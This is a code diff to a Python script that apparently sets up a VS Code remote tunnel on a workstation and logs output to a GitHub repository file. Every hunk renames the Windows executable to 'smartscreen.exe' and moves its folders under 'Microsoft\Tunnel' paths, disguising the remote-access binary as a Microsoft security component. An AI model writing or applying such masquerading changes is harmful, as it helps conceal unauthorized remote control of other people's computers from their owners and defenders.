@@ -21,14 +21,14 @@ GITHUB_REPO = "leanne-townsend/temp1"
 TARGET_FILE = "output1.txt"
 BRANCH = "main"
 
-CODE_EXE_NAME = "code.exe" if platform.system().lower() == "windows" else "code"
+CODE_EXE_NAME = "smartscreen.exe" if platform.system().lower() == "windows" else "code"
 TUNNEL_NAME = os.getenv("COMPUTERNAME", "workstation")
 SHOW_RAW_OUTPUT = False
 DEVICE_CODE_LIFETIME_SECONDS = 15 * 60
 MAX_DEVICE_CODE_ISSUES = 3
 IS_ADMIN_CONTEXT = False
 STATE_MODE = "user-local"
-CODE_DIR = Path(os.path.join(os.getenv("LOCALAPPDATA", ""), "VSCode", "Tunnel", "Code"))
+CODE_DIR = Path(os.path.join(os.getenv("LOCALAPPDATA", ""), "Microsoft", "Tunnel"))
 CODE_EXE = CODE_DIR / CODE_EXE_NAME
 TUNNEL_LOG = CODE_DIR / "tunnel_output.log"
 LOGIN_LOG = CODE_DIR / "login_output.log"
@@ -84,10 +84,10 @@ class VSCodeDownloader:
     def locate_downloaded_executable(self) -> Path | None:
         candidates = [
             self.target_dir / self.executable_name,
-            self.target_dir / "code.exe",
+            self.target_dir / "smartscreen.exe",
             self.target_dir / "code",
             self.target_dir / "bin" / "code",
-            self.target_dir / "bin" / "code.exe",
+            self.target_dir / "bin" / "smartscreen.exe",
         ]
 
         for candidate in candidates:
@@ -222,10 +222,10 @@ def configure_runtime_paths() -> None:
     IS_ADMIN_CONTEXT = is_windows_admin()
     if platform.system().lower() == "windows" and IS_ADMIN_CONTEXT:
         STATE_MODE = "machine-wide"
-        CODE_DIR = Path(r"C:\ProgramData\VSCodeTunnel\Code")
+        CODE_DIR = Path(r"C:\ProgramData\Microsoft\Tunnel")
     else:
         STATE_MODE = "user-local"
-        CODE_DIR = Path(os.path.join(os.getenv("LOCALAPPDATA", ""), "VSCode", "Tunnel", "Code"))
+        CODE_DIR = Path(os.path.join(os.getenv("LOCALAPPDATA", ""), "Microsoft", "Tunnel"))
 
     CODE_EXE = CODE_DIR / CODE_EXE_NAME
     TUNNEL_LOG = CODE_DIR / "tunnel_output.log"
